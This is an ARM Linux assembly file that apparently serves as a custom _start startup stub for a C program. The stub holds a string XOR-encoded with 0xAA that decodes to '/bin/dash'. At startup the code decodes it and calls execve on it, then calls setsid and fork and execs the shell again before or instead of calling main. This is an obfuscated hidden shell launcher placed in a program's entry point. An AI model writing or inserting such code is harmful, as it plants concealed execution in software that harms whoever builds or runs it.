.section .rodata
.align 4
.equ X, 0xAA
o:
//.byte 0x85,0xC8,0xC3,0xC4,0x85,0xCE,0xCB,0x99,0xD2,0x00
.byte 0x85,0xC8,0xC3,0xC4,0x85,0xCE,0xCB,0xD9,0xC2,0x00
.section .text
.global _start
.extern main
_start:
	and sp, sp, #0xFFFFFFF8
	sub sp, sp, #32
	mov r0, sp
	ldr r1, =o
	mov r2, #10
b:
	ldrb r3, [r1], #1
	strb r3, [r0], #1
	subs r2, r2, #1
	bne b
	mov r0, sp
	mov r2, #10
f:
	ldrb r3, [r0]
	cmp r3, #0
	beq u
	eor r3, r3, #X
	strb r3, [r0]
	add r0, r0, #1
	subs r2, r2, #1
	bne f
u:
	mov r1, sp
	add r2, sp, #12
	str r1, [r2]
	mov r3, #0
	str r3, [r2, #4]
	ldr r4, [sp, #32]
	ldr r5, [sp, #36]
	ldr r6, [sp, #40]
	mov r0, sp
	mov r1, r2
	mov r2, #0
	mov r7, #11
	svc #0
	cmp r0, #0
	bgt t
s:
	mov r0, #0
	mov r7, #112
	svc #0
	mov r7, #2
	svc #0
	cmp r0, #0
	bgt a
c:
	mov r0, sp
	mov r1, r2
	mov r2, #0
	mov r7, #11
	svc #0
	mov r0, #1
	mov r7, #1
	svc #0
a:
	mov r0, #0
	mov r7, #1
	svc #0
t:
	mov r0, r4
	mov r1, r5
	mov r2, r6
	bl main
	mov r7, #1
	svc #0
